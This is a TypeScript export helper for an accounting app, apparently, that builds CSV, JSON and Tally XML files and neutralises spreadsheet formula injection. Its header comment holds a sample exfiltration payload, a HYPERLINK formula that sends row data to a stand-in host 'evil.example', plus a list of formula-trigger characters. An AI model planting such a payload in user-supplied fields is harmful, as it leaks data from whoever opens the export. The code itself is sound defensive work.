"use client";

type Row = Record<string, unknown>;

/**
 * CSV FORMULA INJECTION — Task 11.9.
 *
 * `escapeCell` handled CSV *quoting* correctly and did nothing about
 * *execution*. Excel, LibreOffice and Google Sheets all treat a cell whose
 * first character is `=`, `+`, `-` or `@` as a **formula**, and quoting does
 * not disarm it — the quotes are consumed by the CSV parser and the formula is
 * what reaches the cell.
 *
 * That matters here specifically because every export in this application is
 * built from **user-supplied text**: customer names, bank-order remarks, ledger
 * narrations, party names. Anyone who can create a customer can name them
 * `=HYPERLINK("https://evil.example?d="&A1&A2,"Click")`, and the operator who
 * opens the export leaks the row.
 *
 * ── A LEADING APOSTROPHE, NOT STRIPPING ─────────────────────────────────────
 *
 * Prefixing with `'` is the OWASP guidance and it is **lossless**: the sheet
 * displays the original text and treats it as a string. Stripping the character
 * would silently corrupt real data — `-500 adjustment` is a legitimate ledger
 * narration, and an accountant reconciling against `500 adjustment` has been
 * handed a falsified figure. A privacy control that alters financial text is
 * not an improvement.
 *
 * Tab and carriage return are included because a leading whitespace character
 * is not always stripped by the parser, so `\t=1+1` can still arrive as a
 * formula.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

export function neutraliseFormula(text: string): string {
  return FORMULA_TRIGGERS.some((c) => text.startsWith(c)) ? `'${text}` : text;
}

function escapeCell(value: unknown) {
  const text = value === null || value === undefined ? "" : String(value);
  // Disarm BEFORE quoting: the prefix must sit inside the quoted field, or the
  // CSV parser strips it back off and the formula survives.
  const cleaned = neutraliseFormula(text).replace(/"/g, '""');
  return /[",\n]/.test(cleaned) ? `"${cleaned}"` : cleaned;
}

export function toCsv(rows: Row[], headers?: string[]) {
  if (!rows.length) return "";
  const cols = headers ?? Object.keys(rows[0]);
  const body = rows.map((row) => cols.map((col) => escapeCell(row[col])).join(","));
  return [cols.join(","), ...body].join("\n");
}

export function downloadFile(filename: string, content: string, mime = "text/csv;charset=utf-8;") {
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}

export function exportCsv(filename: string, rows: Row[], headers?: string[]) {
  downloadFile(filename.endsWith(".csv") ? filename : `${filename}.csv`, toCsv(rows, headers));
}

export function exportJson(filename: string, rows: unknown) {
  downloadFile(
    filename.endsWith(".json") ? filename : `${filename}.json`,
    JSON.stringify(rows, null, 2),
    "application/json",
  );
}

export function exportTallyXml(filename: string, rows: Row[], voucherType = "Receipt") {
  const vouchers = rows
    .map(
      (row) => `    <VOUCHER VCHTYPE="${voucherType}" ACTION="Create">
      <DATE>${escapeXml(row.date)}</DATE>
      <NARRATION>${escapeXml(row.narration ?? row.particulars ?? "")}</NARRATION>
      <PARTYLEDGERNAME>${escapeXml(row.party ?? row.bank ?? "")}</PARTYLEDGERNAME>
      <AMOUNT>${escapeXml(row.amount ?? 0)}</AMOUNT>
    </VOUCHER>`,
    )
    .join("\n");

  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<ENVELOPE>
  <HEADER><TALLYREQUEST>Import Data</TALLYREQUEST></HEADER>
  <BODY>
${vouchers}
  </BODY>
</ENVELOPE>`;

  downloadFile(
    filename.endsWith(".xml") ? filename : `${filename}.xml`,
    xml,
    "application/xml;charset=utf-8;",
  );
}

function escapeXml(value: unknown) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    // Quotes too — these values are user-supplied and Tally's importer reads
    // attributes as well as element text (Task 11.9).
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}
